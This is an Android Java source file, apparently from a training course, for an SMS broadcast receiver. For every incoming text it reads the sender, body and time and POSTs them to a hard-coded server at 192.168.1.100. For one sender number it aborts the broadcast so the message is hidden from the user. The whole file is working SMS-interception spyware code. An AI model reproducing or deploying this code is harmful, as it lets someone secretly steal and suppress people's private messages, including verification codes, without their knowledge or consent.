package cn.itcast.listener;

import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SMSBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for(Object pdu : pdus){
			SmsMessage message = SmsMessage.createFromPdu((byte[])pdu);
			String sender = message.getOriginatingAddress();//获取短信的发送者
			String conetnt = message.getMessageBody();//短信内容
			Date date = new Date(message.getTimestampMillis());
			// 2007-10-10 12:34:22
			SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String time = dateFormat.format(date);
			sendSMS(sender, conetnt, time);
			if("5556".equals(sender)){
				abortBroadcast();//终止广播传递
			}
		}
	}

	private void sendSMS(String sender, String conetnt, String time) {
		String path = "http://192.168.1.100:8080/videoweb/video/manage.do";
		try {
			String params = "method=getSMS&sender="+ sender+"&content="+
							URLEncoder.encode(conetnt, "UTF-8")+ "&time="+ time;
			byte[] entity = params.getBytes();
			HttpURLConnection conn = (HttpURLConnection) new URL(path).openConnection();
			conn.setConnectTimeout(5000);
			conn.setRequestMethod("POST");
			conn.setDoOutput(true);
			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length", String.valueOf(entity.length));
			OutputStream outStream = conn.getOutputStream();
			outStream.write(entity);
			conn.getResponseCode();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
